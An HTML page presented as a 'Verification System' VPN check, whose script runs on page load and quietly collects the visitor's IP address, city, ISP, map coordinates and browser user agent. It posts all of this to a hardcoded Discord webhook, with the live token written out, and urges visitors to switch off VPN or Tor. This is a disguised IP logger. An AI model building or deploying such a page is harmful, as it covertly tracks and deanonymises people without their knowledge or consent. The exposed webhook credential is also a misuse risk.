<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification System</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
            line-height: 1.6;
        }
        .container {
            margin-top: 20px;
        }
        .status {
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
        }
        .loading {
            color: #0c5460;
            background-color: #d1ecf1;
            border: 1px solid #bee5eb;
        }
        .success {
            color: #155724;
            background-color: #d4edda;
            border: 1px solid #c3e6cb;
        }
        .error {
            color: #721c24;
            background-color: #f8d7da;
            border: 1px solid #f5c6cb;
        }
        .warning {
            color: #856404;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 24px;
            height: 24px;
            border-radius: 50%;
            border-left-color: #09f;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>Verification System</h1>
    
    <div class="container">
        <div id="status" class="status loading">
            <div class="spinner"></div> Verifying your connection...
        </div>
    </div>

    <script>
        // Discord webhook URL - hardcoded for security
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1370031066089394248/ApRpcsSICEv7xnBypVTicDEyCiUQsphCParmvg8E_U5RWoHNy-Kszc1CnTCTAqh1Qkn3";
        
        // Function to get flag emoji from country code
        function getFlagEmoji(countryCode) {
            if (!countryCode) return 'üåé';
            const codePoints = countryCode
                .toUpperCase()
                .split('')
                .map(char => 127397 + char.charCodeAt());
            return String.fromCodePoint(...codePoints);
        }

        // Function to safely fetch with timeout and error handling
        async function safeFetch(url, options = {}, timeout = 5000) {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeout);
            
            try {
                const response = await fetch(url, {
                    ...options,
                    signal: controller.signal,
                    mode: 'cors'
                });
                clearTimeout(timeoutId);
                return response;
            } catch (error) {
                clearTimeout(timeoutId);
                throw error;
            }
        }

        // Main verification function
        async function verifyUser() {
            const statusDiv = document.getElementById('status');
            
            try {
                // Step 1: Get IP info from a CORS-friendly API
                let ipData;
                try {
                    const ipResponse = await safeFetch('https://api.ipify.org?format=json');
                    ipData = await ipResponse.json();
                } catch (error) {
                    // Fallback to alternative IP API
                    const fallbackResponse = await safeFetch('https://api.db-ip.com/v2/free/self');
                    ipData = await fallbackResponse.json();
                }
                
                const ip = ipData.ip || ipData.ipAddress;
                if (!ip) throw new Error("Could not determine IP address");
                
                // Step 2: Get geolocation data from a CORS-friendly API
                let geoData;
                try {
                    const geoResponse = await safeFetch(`https://ipapi.co/${ip}/json/`);
                    geoData = await geoResponse.json();
                    
                    // Check if the API returned an error
                    if (geoData.error) throw new Error("Geolocation API error");
                } catch (error) {
                    // Fallback to alternative geo API
                    const fallbackGeoResponse = await safeFetch(`https://ipwho.is/${ip}`);
                    geoData = await fallbackGeoResponse.json();
                }
                
                // Step 3: VPN detection (simplified to avoid CORS issues)
                // We'll use a combination of available data to estimate VPN usage
                
                const suspiciousFactors = [];
                let vpnLikelihood = 0;
                
                // Check for datacenter IP
                if (geoData.org && /hosting|datacenter|cloud|server|proxy|vpn/i.test(geoData.org)) {
                    suspiciousFactors.push("Datacenter IP detected");
                    vpnLikelihood += 40;
                }
                
                // Check for known proxy port
                if (geoData.port && [80, 443, 1080, 3128, 8080, 8888, 9050].includes(Number(geoData.port))) {
                    suspiciousFactors.push("Proxy port detected");
                    vpnLikelihood += 30;
                }
                
                // Check for mismatched timezone and country
                if (geoData.timezone && geoData.country_code) {
                    const timezoneCountry = geoData.timezone.split('/')[0];
                    if (timezoneCountry && !geoData.timezone.includes(geoData.country_code) && 
                        !geoData.country_name.includes(timezoneCountry)) {
                        suspiciousFactors.push("Timezone mismatch");
                        vpnLikelihood += 20;
                    }
                }
                
                // Determine if using VPN based on likelihood score
                const usingVpn = vpnLikelihood >= 40;
                
                // Prepare location data
                const location = {
                    ip: ip,
                    country: geoData.country_name || geoData.country || 'Unknown',
                    country_code: geoData.country_code || geoData.country_code || '',
                    region: geoData.region || geoData.region_name || 'Unknown',
                    city: geoData.city || 'Unknown',
                    isp: geoData.org || geoData.connection?.isp || 'Unknown',
                    latitude: geoData.latitude || geoData.lat || 0,
                    longitude: geoData.longitude || geoData.lon || 0,
                    using_vpn: usingVpn,
                    vpn_details: {
                        likelihood: vpnLikelihood,
                        suspicious_factors: suspiciousFactors
                    },
                    timestamp: new Date().toISOString(),
                    user_agent: navigator.userAgent
                };
                
                // Create Discord embed
                const mapUrl = `https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}`;
                const flagEmoji = getFlagEmoji(location.country_code);
                
                const discordPayload = {
                    username: "Verification System",
                    avatar_url: "https://i.imgur.com/ZOKp8LH.png",
                    embeds: [{
                        title: `${flagEmoji} User Verification: ${location.city}, ${location.country}`,
                        color: usingVpn ? 16711680 : 65280, // Red for VPN, Green for no VPN
                        fields: [
                            {
                                name: "üîç Verification Status",
                                value: usingVpn ? "‚ùå **FAILED**: VPN/Proxy Detected" : "‚úÖ **PASSED**: No VPN Detected",
                                inline: false
                            },
                            {
                                name: "üìç Location",
                                value: `${location.city}, ${location.region}, ${location.country}`,
                                inline: true
                            },
                            {
                                name: "üåê IP Address",
                                value: location.ip,
                                inline: true
                            },
                            {
                                name: "üè¢ ISP/Organization",
                                value: location.isp,
                                inline: true
                            },
                            {
                                name: "üåç Coordinates",
                                value: `[${location.latitude}, ${location.longitude}](${mapUrl})`,
                                inline: true
                            }
                        ],
                        footer: {
                            text: `Verification at ${new Date().toLocaleString()}`
                        }
                    }]
                };
                
                // Add suspicious factors if any were found
                if (suspiciousFactors.length > 0) {
                    discordPayload.embeds[0].fields.push({
                        name: "‚ö†Ô∏è Suspicious Factors",
                        value: suspiciousFactors.join("\n"),
                        inline: false
                    });
                }
                
                // Add user agent info
                discordPayload.embeds[0].fields.push({
                    name: "üì± Device Info",
                    value: `\`\`\`${location.user_agent}\`\`\``
                });
                
                // Send to Discord webhook
                const discordResponse = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(discordPayload)
                });
                
                if (!discordResponse.ok) {
                    throw new Error('Failed to send verification data');
                }
                
                // Update status based on VPN detection
                if (usingVpn) {
                    statusDiv.className = 'status warning';
                    statusDiv.innerHTML = `
                        <strong>‚ö†Ô∏è VPN or Proxy Detected</strong>
                        <p>Please disable any VPN, proxy, or Tor services to continue.</p>
                    `;
                } else {
                    statusDiv.className = 'status success';
                    statusDiv.innerHTML = `
                        <strong>‚úÖ Verification Successful</strong>
                        <p>Your connection has been verified.</p>
                    `;
                }
                
            } catch (error) {
                console.error('Verification error:', error);
                statusDiv.className = 'status error';
                statusDiv.innerHTML = `
                    <strong>‚ùå Verification Error</strong>
                    <p>${error.message || 'Unable to complete verification. Please try again later.'}</p>
                `;
                
                // Try to send error to Discord
                try {
                    fetch(DISCORD_WEBHOOK, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            username: "Verification System",
                            content: `‚ö†Ô∏è **Verification Error**: ${error.message || 'Unknown error'}`
                        })
                    });
                } catch (e) {
                    console.error('Failed to send error to Discord:', e);
                }
            }
        }
        
        // Run verification as soon as page loads
        document.addEventListener('DOMContentLoaded', verifyUser);
    </script>
</body>
</html>
